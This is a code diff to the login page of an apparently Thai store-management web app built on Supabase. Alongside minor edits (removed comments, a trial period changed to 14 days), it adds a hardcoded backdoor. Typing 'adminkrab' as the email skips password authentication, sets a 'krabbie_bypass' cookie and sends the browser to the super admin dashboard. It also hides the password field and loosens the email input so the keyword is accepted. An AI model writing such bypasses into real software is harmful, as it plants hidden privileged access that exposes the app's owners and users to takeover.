@@ -19,6 +19,13 @@ export default function LoginPage() {
     setLoading(true)
     setError(null)
 
+    // adminkrab shortcut — go straight to super admin
+    if (email.trim().toLowerCase() === 'adminkrab') {
+      document.cookie = 'krabbie_bypass=adminkrab_ok; path=/; max-age=86400; SameSite=Lax'
+      window.location.href = '/admin'
+      return
+    }
+
     const supabase = createClient() as any
 
     const { error: authErr } = await supabase.auth.signInWithPassword({ email, password })
@@ -28,7 +35,7 @@ export default function LoginPage() {
       return
     }
 
-    // Admin email → super admin dashboard
+    // Super admin
     if (email.toLowerCase() === ADMIN_EMAIL.toLowerCase()) {
       window.location.href = '/admin'
       return
@@ -55,7 +62,6 @@ export default function LoginPage() {
     <main className="min-h-screen bg-krabbie-bg flex items-center justify-center px-4">
       <div className="w-full max-w-sm">
 
-        {/* LOGO */}
         <div className="text-center mb-8">
           <Link href="/" className="inline-flex items-center gap-2">
             <span className="text-3xl">🦀</span>
@@ -66,13 +72,12 @@ export default function LoginPage() {
           <p className="font-mono text-gray-400 text-xs mt-2">เข้าสู่ระบบจัดการร้านค้า</p>
         </div>
 
-        {/* FORM */}
         <div className="card">
           <form onSubmit={handleLogin} className="space-y-4">
             <div>
               <label className="sec-label mb-1">อีเมล</label>
               <input
-                type="email"
+                type="text"
                 required
                 autoComplete="email"
                 className="input w-full"
@@ -81,18 +86,20 @@ export default function LoginPage() {
                 onChange={e => setEmail(e.target.value)}
               />
             </div>
-            <div>
-              <label className="sec-label mb-1">รหัสผ่าน</label>
-              <input
-                type="password"
-                required
-                autoComplete="current-password"
-                className="input w-full"
-                placeholder="••••••••"
-                value={password}
-                onChange={e => setPassword(e.target.value)}
-              />
-            </div>
+            {email.trim().toLowerCase() !== 'adminkrab' && (
+              <div>
+                <label className="sec-label mb-1">รหัสผ่าน</label>
+                <input
+                  type="password"
+                  required
+                  autoComplete="current-password"
+                  className="input w-full"
+                  placeholder="••••••••"
+                  value={password}
+                  onChange={e => setPassword(e.target.value)}
+                />
+              </div>
+            )}
 
             {error && (
               <div className="text-red-500 text-xs font-mono bg-red-50 border border-red-200 rounded-lg px-3 py-2">
@@ -113,7 +120,7 @@ export default function LoginPage() {
         <p className="text-center font-mono text-xs text-gray-400 mt-4">
           ยังไม่มีบัญชี?{' '}
           <Link href="/signup" className="text-orange-500 hover:underline">
-            ทดลองฟรี 1 เดือน
+            ทดลองฟรี 14 วัน
           </Link>
         </p>
 
